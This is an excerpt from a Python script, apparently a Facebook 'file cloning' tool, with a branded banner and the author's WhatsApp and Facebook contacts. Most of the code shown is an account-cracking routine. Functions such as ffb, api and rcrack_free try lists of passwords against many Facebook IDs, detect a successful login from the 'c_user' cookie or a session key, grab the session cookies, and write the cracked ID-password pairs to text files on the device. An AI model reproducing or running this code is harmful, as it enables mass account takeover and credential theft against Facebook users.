...
def menu_apikey():
  ...
  print(f"""\x1b[1;97m
██████╗░██████╗░░█████╗░
██╔══██╗██╔══██╗██╔══██╗\033[1;33m𝐁\033[1;37m
██████╦╝██████╔╝██║░░██║\033[1;34m𝐑\033[1;37m
██╔══██╗██╔══██╗██║░░██║\033[1;35m𝗢\033[1;37m
██████╦╝██║░░██║╚█████╔╝\033[1;36m𝐗\033[1;37m
╚═════╝░╚═╝░░╚═╝░╚════╝░

  \033[1;32m┌──────────────────────────────────────────────┐
\033[1;32m │\33[37;41m\t    𝚉𝙸𝙷𝙰𝙳 𝙱𝚁𝙾 FILE CLONING VERSION   \33[0;m  │
 \033[1;32m└──────────────────────────────────────────────┘
 
 \033[1;32m┌────────────────────────────────────────────────┐
 \033[1;32m│\033[1;31m➣\033[1;91m DEVELOPMENT     \033[1;31m:\033[1;32m𝚉𝙸𝙷𝙰𝙳 𝙱𝚁𝙾
 \033[1;32m│\033[1;31m➣\033[1;32m FACEBOOK        \033[1;31m:\033[1;32m //wa.me/+𝟾𝟾𝟶𝟷𝟹𝟶𝟸𝟺𝟸𝟼𝟷𝟺𝟿
 \033[1;32m│\033[1;31m➣\033[1;91m WHATSAPP        \033[1;31m:\033[1;32m [+𝟾𝟾𝟶𝟷𝟹𝟶𝟸𝟺𝟸𝟼𝟷𝟺𝟿]
 \033[1;32m│\033[1;31m➣\033[1;32m GITHUB          \033[1;31m:\033[1;32m 𝙼𝚁-𝙷𝙰𝙺𝙴𝚁𝟸
 \033[1;32m└────────────────────────────────────────────────┘\n""")                                          
  ...
  os.system(f'xdg-open {tan}:https://www.facebook.com/profile.php?id=100083131624990')
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+𝟾𝟾𝟶𝟷𝟹𝟶𝟸𝟺𝟸𝟼𝟷𝟺𝟿?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
\033[1;32m[-] AUTHOR    :\033[1;32m 𝚉𝙸𝙷𝙰𝙳 𝙷𝙰𝚂𝙰𝙽
\033[1;32m[-] GITHUB    :\033[1;32m 𝙼𝚁-𝙷𝙰𝙺𝙴𝚁𝟸
\033[1;32m[-] FACEBOOK  :\033[1;32m 𝙹𝙸𝙷𝙰𝙳 𝙷𝙰𝚂𝙰𝙽
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS 𝚉𝙸𝙷𝙰𝙳 BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [𝚉𝙸𝙷𝙰𝙳] %s|\033[1;32m𝚉𝙸𝙷𝙰𝙳full:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [𝚉𝙸𝙷𝙰𝙳] %s | %s'%(ids,pas))
                                open(f'/sdcard/𝚉𝙸𝙷𝙰𝙳.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif '𝚉𝙸𝙷𝙰𝙳' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [𝚉𝙸𝙷𝙰𝙳] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/𝚉𝙸𝙷𝙰𝙳.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
...
def ffb3(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [𝚉𝙸𝙷𝙰𝙳 %s|\033[1;32m𝚉𝙸𝙷𝙰𝙳:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def ffb4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [𝚉𝙸𝙷𝙰𝙳] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [𝚉𝙸𝙷𝙰𝙳] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/𝚉𝙸𝙷𝙰𝙳.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [𝚉𝙸𝙷𝙰𝙳ful] %s | %s'%(ids,pas))
                                open(f'/sdcard/𝚉𝙸𝙷𝙰𝙳.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
...
def bd():
                ...
                print(' Total 𝚉𝙸𝙷𝙰𝙳ful/𝚉𝙸𝙷𝙰𝙳: '+str(len(oks))+'/'+str(len(cps)))
...
def gml():
                ...
                linex()
                print(' The process has completed')
                print(' Total 𝚉𝙸𝙷𝙰𝙳full/𝚉𝙸𝙷𝙰𝙳: '+str(len(oks))+'/'+str(len(cps)))
...
def rcrack_free(idf,pwv):
    ...
    'user-agent': pro}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[𝚉𝙸𝙷𝙰𝙳ful] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				open('ok.txt', 'a').write(idf+' | '+ps+'\n')
				oks.append(idf)
				break
			elif '𝚉𝙸𝙷𝙰𝙳' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[𝚉𝙸𝙷𝙰𝙳] '+idf+' | '+ps+'\033[0;97m')
